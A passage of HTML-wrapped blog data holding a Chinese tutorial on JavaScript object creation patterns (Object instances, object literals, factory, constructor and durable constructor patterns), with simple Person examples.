136); box-sizing: border-box;\">function</span> <span class=\"\" style=\"box-sizing: border-box;\">Person</span><span class=\"\" style=\"color: rgb(102, 0, 102); box-sizing: border-box;\">(name, age, job)</span>{</span><span class=\"\" style=\"color: rgb(136, 0, 0); box-sizing: border-box;\"> &nbsp; &nbsp;<br> &nbsp; &nbsp;//创建要返回的新对象</span><span class=\"\" style=\"color: rgb(0, 0, 136); box-sizing: border-box;\">&nbsp; &nbsp; <br>&nbsp; &nbsp;var</span> o = <span class=\"\" style=\"color: rgb(0, 0, 136); box-sizing: border-box;\">new</span> <span class=\"\" style=\"color: rgb(102, 0, 102); box-sizing: border-box;\">Object</span>(); <br> &nbsp;<br><span class=\"\" style=\"color: rgb(136, 0, 0); box-sizing: border-box;\"> &nbsp; &nbsp;//可以在这里定义私有变量和函数 &nbsp; &nbsp;<br> &nbsp; &nbsp;<br> &nbsp; &nbsp;//添加方法</span><br>&nbsp; &nbsp;o.sayName = <span class=\"\" style=\"box-sizing: border-box;\"><span class=\"\" style=\"color: rgb(0, 0, 136); box-sizing: border-box;\">function</span><span class=\"\" style=\"color: rgb(102, 0, 102); box-sizing: border-box;\">()</span>{</span>&nbsp;<br>&nbsp; &nbsp; &nbsp;&nbsp;alert(<span class=\"\" style=\"color: rgb(0, 0, 136); box-sizing: border-box;\">this</span>.name);<br> &nbsp; &nbsp;<br>&nbsp; &nbsp;}; &nbsp; &nbsp;<br><br> &nbsp; &nbsp;<span class=\"\" style=\"color: rgb(136, 0, 0); box-sizing: border-box;\">//返回对象</span><span class=\"\" style=\"color: rgb(0, 0, 136); box-sizing: border-box;\"><br>&nbsp; &nbsp;return</span> o;<br> &nbsp; &nbsp;}</span></code></pre><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"color: rgb(136, 136, 136);\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;注意，在以这种模式创建的对象中，除了使用<span style=\"color: rgb(0, 128, 255);\">sayName()</span>方法之外，没有其他办法访问<span style=\"color: rgb(0, 128, 255);\">name</span>的值。可以像下面使用稳妥的<span style=\"color: rgb(0, 128, 255);\">Person</span>构造函数：</span></p><pre class=\"\" name=\"code\" style=\" white-space: nowrap; word-wrap: break-word; box-sizing: border-box;  overflow-y: hidden; overflow-x: auto; margin-top: 0px; margin-bottom: 1.1em ; ; ; ; ; ; ; ; ; ; ; ; ; \"><code class=\"\" style=\" display: block; background: transparent; color: inherit; box-sizing: border-box ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\"><span class=\"\" style=\"color: rgb(0, 0, 136); box-sizing: border-box;\">var</span> person =Person(<span class=\"\" style=\"color: rgb(0, 136, 0); box-sizing: border-box;\">“weiqi”</span>,<span class=\"\" style=\"color: rgb(0, 102, 102); box-sizing: border-box;\">22</span>,<span class=\"\" style=\"color: rgb(0, 136, 0); box-sizing: border-box;\">“banzhuan”</span>);<br>person.sayName(); &nbsp; <span class=\"\" style=\"color: rgb(136, 0, 0); box-sizing: border-box;\">//weiqi</span></span></code></pre><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"color: rgb(136, 136, 136);\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;这样，变量<span style=\"color: rgb(0, 128, 255);\">person</span>中保存的是一个稳妥对象，而除了<span style=\"color: rgb(0, 128, 255);\">sayName()</span>方法外，没有别的方式可以访问其他数据成员。即使有其他代码会给这个对象添加方法或数据成员，但也不可能有别的办法访问传入到构造函数中的原始数据。稳妥构造函数模式提供的这种安全性，使得他非常适合在某些安全执行环境–例如，ADsafe(www.adsafe.org)提供的环境下使用。&nbsp;</span></p><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"color: rgb(136, 136, 136);\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style=\"color: rgb(247, 92, 47);\"><strong>注意：与寄生构造函数模式类似，使用稳妥构造函数模式创建的对象与构造函数之间没有什么关系，因此instanceof操作符对这种对象也没有意义。</strong></span></span></p></section></section></section></p>\n<blockquote>\n<p>转自：<a href=\"http://blog.csdn.net/u014346301/article/details/52204967\" target=\"_blank\" rel=\"external\">http://blog.csdn.net/u014346301/article/details/52204967</a></p>\n</blockquote>\n","excerpt":"","more":"<p><section class=\"\" data-tools=\"135编辑器\" data-id=\"87859\" style=\"   box-sizing: border-box; \"><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"color: rgb(136, 136, 136);\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;ECMA-262把<span style=\"color: rgb(0, 128, 255);\">对象</span>定义为：”无需属性的集合，其属性可以包含基本值、对象或者函数。”严格来讲，这就相当于说明对象是一组没有特定顺序的值。对象的每个属性或方法都有一个名字，而每个名字都映射到一个值。正因为这样，我们可以把ECMAScript的对象想象成散列表：无非就是一组名对值，其中值可以是数据或函数。&nbsp;</span></p><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"color: rgb(136, 136, 136);\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;创建自定义对象最简单的方式就是创建一个<span style=\"color: rgb(0, 128, 255);\">Object</span>的实例，然后再为他添加属性和方法，如下所示：</span></p></section><pre class=\"\" name=\"code\" style=\" white-space: nowrap;  overflow-y: hidden; overflow-x: auto; margin-bottom: 1.1em ; ; ; ; ; ; ; ; ; ; ; ; ; ; \"><p style=\"white-space: normal;\"><code class=\"\" style=\" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\"><span class=\"\" style=\"color: rgb(0, 0, 136);\">var</span> person = <span class=\"\" style=\"color: rgb(0, 0, 136);\">new</span> <span class=\"\" style=\"color: rgb(102, 0, 102);\">Object</span>();、</span></code><code class=\"\" style=\" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\">person.name = <span class=\"\" style=\"font-size: 12px; color: rgb(0, 136, 0);\">“liubei”</span>;</span></code></p><code class=\"\" style=\" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\">person.age = <span class=\"\" style=\"font-size: 12px; color: rgb(0, 102, 102);\">29</span>;<br>person.job = <span class=\"\" style=\"font-size: 12px; color: rgb(0, 136, 0);\">“shayemuyou”</span>;<br><br>person.sayName = <span class=\"\" style=\"font-size: 12px; color: rgb(0, 0, 136);\">function</span><span class=\"\" style=\"font-size: 12px; color: rgb(102, 0, 102);\">()</span>{<br> &nbsp; &nbsp;<br>&nbsp; alert(<span class=\"\" style=\"font-size: 12px; color: rgb(0, 0, 136);\">this</span>.name);<br>}</span></code></pre><section class=\"\" data-tools=\"135编辑器\" data-id=\"87859\" style=\"   box-sizing: border-box; \"><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"color: rgb(136, 136, 136);\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;上面的例子创建了一个名为<span style=\"color: rgb(0, 128, 255);\">person</span>的对象，并为他添加了三个属性和一个方法。其中<span style=\"color: rgb(0, 128, 255);\">sayName()</span>方法用于显示name属性，<span style=\"color: rgb(0, 128, 255);\">this.name</span>将被解析为person.name，早期的开发人员经常使用这个模式来创建对象，后来对象字面量的方法成了创建对象的首选模式，上面的例子用对象字面量的语法可以写成如下这样：</span></p></section><pre class=\"\" name=\"code\" style=\" white-space: nowrap;  overflow-y: hidden; overflow-x: auto; margin-bottom: 1.1em ; ; ; ; ; ; ; ; ; ; ; ; ; ; \"><code class=\"\" style=\" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\"><span class=\"\" style=\"color: rgb(0, 0, 136);\">var</span> person = {<br> &nbsp; &nbsp;<br> &nbsp; &nbsp;&nbsp;name:<span class=\"\" style=\"color: rgb(0, 136, 0);\">“liubei”</span>,<br> &nbsp; &nbsp;<br> &nbsp; &nbsp;&nbsp;age:<span class=\"\" style=\"color: rgb(0, 102, 102);\">29</span>,<br> &nbsp; &nbsp;<br> &nbsp; &nbsp;&nbsp;job:<span class=\"\" style=\"color: rgb(0, 136, 0);\">“shayemuyou”</span>,<br> &nbsp; &nbsp;<br> &nbsp; &nbsp;&nbsp;sayName:<span class=\"\" style=\"color: rgb(0, 0, 136);\">function</span><span class=\"\" style=\"color: rgb(102, 0, 102);\">()</span>{<br> &nbsp; &nbsp; &nbsp; &nbsp;<br> &nbsp; &nbsp;&nbsp;alert(<span class=\"\" style=\"color: rgb(0, 0, 136);\">this</span>.name);<br> &nbsp; &nbsp;<br> &nbsp; &nbsp;&nbsp;}<br>}</span></code></pre><section class=\"\" data-tools=\"135编辑器\" data-id=\"87859\" style=\"   box-sizing: border-box; \"><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"color: rgb(136, 136, 136);\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;这个例子中的<span style=\"color: rgb(0, 128, 255);\">person</span>对象和前面的对象是一样的，都有相同的属性和方法。&nbsp;</span></p><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"color: rgb(136, 136, 136);\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;虽然<span style=\"color: rgb(0, 128, 255);\">Object</span>构造函数或者对象字面量的方法都可以用来创建单个对象，但是这些方法有个明显的缺点：使用同一个接口创建很多对象，会产生大量的重复代码。为了解决这个方法，人们开始使用工厂模式的一种变体。</span></p><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"color: rgb(136, 136, 136);\"><br></span></p><p style=\"line-height: 1.75em; text-align: center; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"color: rgb(247, 92, 47); font-size: 14px;\"><strong><span style=\"color: rgb(247, 92, 47);\">一、工厂模式</span></strong></span></p><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"color: rgb(136, 136, 136);\"><br></span></p><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"color: rgb(247, 92, 47);\"><strong>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;工厂模式是软件工程领域一种广为人知的设计模式，这种模式抽象了创建具体对象的过程</strong></span><span style=\"color: rgb(136, 136, 136);\">。考虑到ECMAScript中无法创建类，开发人员就发明了一种函数，用函数来封装以特定接口创建对象的细节，如下所示：</span></p><pre class=\"\" name=\"code\" style=\" white-space: nowrap; word-wrap: break-word; box-sizing: border-box;  overflow-y: hidden; overflow-x: auto; margin-top: 0px; margin-bottom: 1.1em ; ; ; ; ; ; ; ; ; ; ; ; ; \"><code class=\"\" style=\" display: block; background: transparent; color: inherit; box-sizing: border-box ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\"><span class=\"\" style=\"box-sizing: border-box;\"><span class=\"\" style=\"color: rgb(0, 0, 136); box-sizing: border-box;\">function</span> <span class=\"\" style=\"box-sizing: border-box;\">createPerson</span><span class=\"\" style=\"color: rgb(102, 0, 102); box-sizing: border-box;\">(name, age, job)</span>{</span><br> <br><span class=\"\" style=\"color: rgb(0, 0, 136); box-sizing: border-box;\">&nbsp; var</span> o = <span class=\"\" style=\"color: rgb(0, 0, 136); box-sizing: border-box;\">new</span> <span class=\"\" style=\"color: rgb(102, 0, 102); box-sizing: border-box;\">Object</span>();<br> &nbsp; &nbsp; &nbsp; &nbsp;&nbsp; o.name = name; <br> &nbsp; &nbsp; &nbsp; &nbsp;&nbsp; o.age = age; <br> &nbsp; &nbsp; &nbsp; &nbsp;&nbsp; o.job = job;<br> &nbsp; &nbsp; &nbsp; &nbsp;&nbsp; o.sayName = <span class=\"\" style=\"box-sizing: border-box;\"><span class=\"\" style=\"color: rgb(0, 0, 136); box-sizing: border-box;\">function</span><span class=\"\" style=\"color: rgb(102, 0, 102); box-sizing: border-box;\">()</span>{</span><br> &nbsp; &nbsp; &nbsp; &nbsp;<br> &nbsp; &nbsp; &nbsp; &nbsp;&nbsp; alert(<span class=\"\" style=\"color: rgb(0, 0, 136); box-sizing: border-box;\">this</span>.name);<br> &nbsp; &nbsp;<br>&nbsp; }<br> &nbsp;<span class=\"\" style=\"color: rgb(0, 0, 136); box-sizing: border-box;\">return</span> o;<br>}<br><span class=\"\" style=\"color: rgb(0, 0, 136); box-sizing: border-box;\">var</span> person1 = createPerson(<span class=\"\" style=\"color: rgb(0, 136, 0); box-sizing: border-box;\">“wei”</span>,<span class=\"\" style=\"color: rgb(0, 102, 102); box-sizing: border-box;\">25</span>,<span class=\"\" style=\"color: rgb(0, 136, 0); box-sizing: border-box;\">“software”</span>);<br><span class=\"\" style=\"color: rgb(0, 0, 136); box-sizing: border-box;\">var</span> person2 = createPerson(<span class=\"\" style=\"color: rgb(0, 136, 0); box-sizing: border-box;\">“bu”</span>,<span class=\"\" style=\"color: rgb(0, 102, 102); box-sizing: border-box;\">25</span>,<span class=\"\" style=\"color: rgb(0, 136, 0); box-sizing: border-box;\">“software”</span>);</span></code></pre><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"color: rgb(136, 136, 136);\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;函数<span style=\"color: rgb(0, 128, 255);\">createPerson()</span>能够根据接受的参数来构建一个包含所有必要信息的<span style=\"color: rgb(0, 128, 255);\">Person</span>对象。可以多次调用这个函数，每次都会返回一个包含三个属性一个方法的对象。工厂模式虽然解决了创建多个相似对象的问题，但却没有解决对象识别的问题，即怎么样知道这是哪个对象类型。</span><br></p><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"color: rgb(136, 136, 136);\"><br></span></p><p style=\"line-height: 1.75em; text-align: center; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"color: rgb(247, 92, 47);\"><strong>二、构造函数模式</strong></span></p><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><br></p><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"color: rgb(136, 136, 136);\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;像Array、Object这样的原生构造函数，在运行时会自动出现在执行环境中。此外，我们可以创建自定义个构造函数，从而定义自定义类型的属性和方法。例如，我们可以使用构造函数重写上个例子：</span></p><section data-role=\"outer\" label=\"Powered by 135editor.com\" style=\"font-family: 微软雅黑;\"><pre class=\"\" name=\"code\" style=\" white-space: nowrap;  overflow-y: hidden; overflow-x: auto; margin-bottom: 1.1em ; ; ; ; ; ; ; ; ; ; ; ; ; ; \"><code class=\"\" style=\" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\"><span class=\"\" style=\"color: rgb(0, 0, 136);\">function</span> Person<span class=\"\" style=\"color: rgb(102, 0, 102);\">(name, age, job)</span>{<span class=\"\" style=\"color: rgb(0, 0, 136);\"> &nbsp; &nbsp;<br> &nbsp; &nbsp;this</span>.name = name;<br><span class=\"\" style=\"color: rgb(0, 0, 136);\"> &nbsp; &nbsp;this</span>.age = age;<br><span class=\"\" style=\"color: rgb(0, 0, 136);\"> &nbsp; &nbsp;this</span>.job = job;<br><span class=\"\" style=\"color: rgb(0, 0, 136);\"> &nbsp; &nbsp;this</span>.sayName = <span class=\"\" style=\"color: rgb(0, 0, 136);\">function</span><span class=\"\" style=\"color: rgb(102, 0, 102);\">()</span>{<br> &nbsp; &nbsp; &nbsp; &nbsp;<br> &nbsp; &nbsp; &nbsp; &nbsp;&nbsp; &nbsp; &nbsp;alert(<span class=\"\" style=\"color: rgb(0, 0, 136);\">this</span>.name);<br> &nbsp; &nbsp;<br> &nbsp; &nbsp;&nbsp; &nbsp;}<br>}<br><span class=\"\" style=\"color: rgb(0, 0, 136);\">var</span> person1 = <span class=\"\" style=\"color: rgb(0, 0, 136);\">new</span> Person(<span class=\"\" style=\"color: rgb(0, 136, 0);\">“wei”</span>,<span class=\"\" style=\"color: rgb(0, 102, 102);\">25</span>,<span class=\"\" style=\"color: rgb(0, 136, 0);\">“software”</span>);<br><span class=\"\" style=\"color: rgb(0, 0, 136);\">var</span> person2 = <span class=\"\" style=\"color: rgb(0, 0, 136);\">new</span> Person(<span class=\"\" style=\"color: rgb(0, 136, 0);\">“bu”</span>,<span class=\"\" style=\"color: rgb(0, 102, 102);\">25</span>,<span class=\"\" style=\"color: rgb(0, 136, 0);\">“software”</span>);</span></code></pre><section data-role=\"outer\" label=\"Powered by 135editor.com\" style=\"font-family: 微软雅黑;\"><section class=\"\" data-tools=\"135编辑器\" data-id=\"87859\" style=\"   box-sizing: border-box; \"><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"color: rgb(136, 136, 136);\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;在这个例子中，<span style=\"color: rgb(0, 128, 255);\">Person()</span>函数取代了<span style=\"color: rgb(0, 128, 255);\">createPerson()</span>函数，我们注意到<span style=\"color: rgb(0, 128, 255);\">Person()</span>与<span style=\"color: rgb(0, 128, 255);\">createPerson()</span>的不同之处在于：</span></p><ul class=\"list-paddingleft-2\"><li><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"color: rgb(136, 136, 136);\">没有显式的创建对象</span></p></li><li><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"color: rgb(136, 136, 136);\">直接将属性和方法赋值给this对象</span></p></li><li><section class=\"\" data-tools=\"135编辑器\" data-id=\"87859\" style=\"   box-sizing: border-box; \"><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"color: rgb(136, 136, 136);\">没有return语句&nbsp;</span></p></section></li></ul><section class=\"\" data-tools=\"135编辑器\" data-id=\"87859\" style=\"   box-sizing: border-box; \"><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"color: rgb(136, 136, 136);\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;此外，还应该<span style=\"color: rgb(247, 92, 47);\"><strong>注意到函数名Person使用的是大写字母P</strong></span>。按照惯例，构造函数始终都应该以一个大写字母开头，而非构造函数则应该以一个小写字母开头。这个做法借鉴了其他OO语言，主要是为了区别于ECMAScript中的其他函数。因为构造函数本身也是函数，只不过可以创建对象而已。&nbsp;</span></p><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"color: rgb(136, 136, 136);\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;要创建一个<span style=\"color: rgb(0, 128, 255);\">Person</span>实例，必须使用<span style=\"color: rgb(0, 128, 255);\">new</span>操作符。以上这种方式会经过以下四个步骤：&nbsp;</span></p><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"color: rgb(136, 136, 136);\">&nbsp;&nbsp;&nbsp;&nbsp;1、创建一个新对象</span></p><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"color: rgb(136, 136, 136);\">&nbsp;&nbsp;&nbsp;&nbsp;2、将构造函数的作用域赋给新对象（因此this指向这个新对象）</span></p><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"color: rgb(136, 136, 136);\">&nbsp;&nbsp;&nbsp;&nbsp;3、执行构造函数中的代码</span></p><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"color: rgb(136, 136, 136);\">&nbsp;&nbsp;&nbsp;&nbsp;4、返回新对象&nbsp;</span></p><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"color: rgb(136, 136, 136);\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;在前面例子的最后，<span style=\"color: rgb(0, 128, 255);\">person1</span>和<span style=\"color: rgb(0, 128, 255);\">person2</span>分别保存着<span style=\"color: rgb(0, 128, 255);\">Person</span>的一个不同的实例。这两个对象都有一个constructor（构造函数）属性，该属性指向Person。如下：</span></p><section data-role=\"outer\" label=\"Powered by 135editor.com\" style=\"font-family: 微软雅黑;\"><section class=\"\" data-tools=\"135编辑器\" data-id=\"87859\" style=\"   box-sizing: border-box; \"><pre class=\"\" name=\"code\" style=\" white-space: nowrap;  overflow-y: hidden; overflow-x: auto; margin-bottom: 1.1em ; ; ; ; ; ; ; ; ; ; ; ; ; ; \"><p style=\"white-space: normal;\"><code class=\"\" style=\" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\">console.<span class=\"\" style=\"color: rgb(0, 0, 136);\">log</span>(person1.constructor == Person); &nbsp; &nbsp; <span class=\"\" style=\"color: rgb(136, 0, 0);\">//true</span></span></code><code class=\"\" style=\" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\">console.<span class=\"\" style=\"font-size: 14px; color: rgb(0, 0, 136);\">log</span>(person2.constructor == Person); &nbsp; &nbsp; <span class=\"\" style=\"font-size: 14px; color: rgb(136, 0, 0);\">//true</span></span></code></p></pre></section><section class=\"\" data-tools=\"135编辑器\" data-id=\"87859\" style=\"   box-sizing: border-box; \"><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"color: rgb(136, 136, 136);\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;对象的<span style=\"color: rgb(0, 128, 255);\">constructor</span>属性最初是用来标识对象类型的。但是，提到检测对象类型，还是<span style=\"color: rgb(0, 128, 255);\">instanceof</span>操作符比较可靠一些。我们在这个例子中创建的对象都是<span style=\"color: rgb(0, 128, 255);\">Object</span>对象的实例，也是<span style=\"color: rgb(0, 128, 255);\">Person</span>对象的实例，这一点通过instanceof操作符可以验证。</span></p><pre class=\"\" name=\"code\" style=\" white-space: nowrap;  overflow-y: hidden; overflow-x: auto; margin-bottom: 1.1em ; ; ; ; ; ; ; ; ; ; ; ; ; ; \"><p style=\"white-space: normal;\"><code class=\"\" style=\" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\"><span class=\"\" style=\"color: rgb(102, 0, 102);\">console</span>.log(person1 <span class=\"\" style=\"color: rgb(0, 0, 136);\">instanceof</span> Object); &nbsp; &nbsp; <span class=\"\" style=\"color: rgb(0, 136, 0);\">//</span><span class=\"\" style=\"color: rgb(0, 102, 102);\">true</span></span></code><code class=\"\" style=\" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\"><span class=\"\" style=\"font-size: 14px; color: rgb(102, 0, 102);\">console</span>.log(person1 <span class=\"\" style=\"font-size: 14px; color: rgb(0, 0, 136);\">instanceof</span> Person); &nbsp; &nbsp; <span class=\"\" style=\"font-size: 14px; color: rgb(0, 136, 0);\">//</span><span class=\"\" style=\"font-size: 14px; color: rgb(0, 102, 102);\">true</span></span></code><code class=\"\" style=\" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\"><span class=\"\" style=\"font-size: 14px; color: rgb(102, 0, 102);\">console</span>.log(person2 <span class=\"\" style=\"font-size: 14px; color: rgb(0, 0, 136);\">instanceof</span> Object); &nbsp; &nbsp; <span class=\"\" style=\"font-size: 14px; color: rgb(0, 136, 0);\">//</span><span class=\"\" style=\"font-size: 14px; color: rgb(0, 102, 102);\">true</span></span></code><code class=\"\" style=\" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\"><span class=\"\" style=\"font-size: 14px; color: rgb(102, 0, 102);\">console</span>.log(person2 <span class=\"\" style=\"font-size: 14px; color: rgb(0, 0, 136);\">instanceof</span> Person); &nbsp; &nbsp; <span class=\"\" style=\"font-size: 14px; color: rgb(0, 136, 0);\">//</span><span class=\"\" style=\"font-size: 14px; color: rgb(0, 102, 102);\">true</span></span></code></p></pre></section><section class=\"\" data-tools=\"135编辑器\" data-id=\"87859\" style=\"   box-sizing: border-box; \"><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"color: rgb(136, 136, 136);\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;创建自定义的构造函数意味着将来可以将他的实例标识为一种特定的类型；而这正是构造函数模式胜过工厂模式的地方。在这个例子中，<span style=\"color: rgb(0, 128, 255);\">person1</span>和<span style=\"color: rgb(0, 128, 255);\">person2</span>之所以同是<span style=\"color: rgb(0, 128, 255);\">Object</span>的实例，是因为所有的对象都继承自Object。</span></p><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"color: rgb(136, 136, 136);\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;构造函数的主要问题，就是每个方法都要在实例上重新创建一遍，造成内存浪费。在前面的例子中，<span style=\"color: rgb(0, 128, 255);\">person1</span>和<span style=\"color: rgb(0, 128, 255);\">person2</span>都有一个名为<span style=\"color: rgb(0, 128, 255);\">sayName()</span>的方法，但是两个方法不是同一<span style=\"color: rgb(0, 128, 255);\">Function</span>的实例。不要忘了ECMAScript中的函数也是对象，因此每定义一个函数，也就是实例化了一个对象，从逻辑角度讲，此时的构造函数可以这样定义：</span></p><pre class=\"\" name=\"code\" style=\" white-space: nowrap;  overflow-y: hidden; overflow-x: auto; margin-bottom: 1.1em ; ; ; ; ; ; ; ; ; ; ; ; ; ; \"><code class=\"\" style=\" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\"><span class=\"\" style=\"color: rgb(0, 0, 136);\">function</span> Person<span class=\"\" style=\"color: rgb(102, 0, 102);\">(name, age, job)</span>{</span></code><p style=\"white-space: normal;\"><code class=\"\" style=\" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\">&nbsp;&nbsp;&nbsp;&nbsp;<span class=\"\" style=\"font-size: 14px; color: rgb(0, 0, 136);\">this</span>.name = name; &nbsp; &nbsp;</span></code><code class=\"\" style=\" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\"><span class=\"\" style=\"font-size: 14px; color: rgb(0, 0, 136);\">&nbsp;&nbsp;&nbsp;&nbsp;this</span>.age = age; &nbsp; &nbsp;</span></code><code class=\"\" style=\" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\"><span class=\"\" style=\"font-size: 14px; color: rgb(0, 0, 136);\">&nbsp;&nbsp;&nbsp;&nbsp;this</span>.job = job; &nbsp; &nbsp;</span></code><code class=\"\" style=\" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\"><span class=\"\" style=\"font-size: 14px; color: rgb(0, 0, 136);\">&nbsp;&nbsp;&nbsp;&nbsp;this</span>.sayName = <span class=\"\" style=\"font-size: 14px; color: rgb(0, 0, 136);\">new</span> <span class=\"\" style=\"font-size: 14px; color: rgb(102, 0, 102);\">Function</span>(<span class=\"\" style=\"font-size: 14px; color: rgb(0, 136, 0);\">“alert(this.name);”</span>) &nbsp; </span></code><code class=\"\" style=\" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\"><span class=\"\" style=\"font-size: 14px; color: rgb(136, 0, 0);\">&nbsp;&nbsp;&nbsp;&nbsp;//与声明函数在逻辑上是等价的</span>}</span></code></p></pre></section><section data-role=\"outer\" label=\"Powered by 135editor.com\" style=\"font-family: 微软雅黑;\"><section class=\"\" data-tools=\"135编辑器\" data-id=\"87859\" style=\"   box-sizing: border-box; \"><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 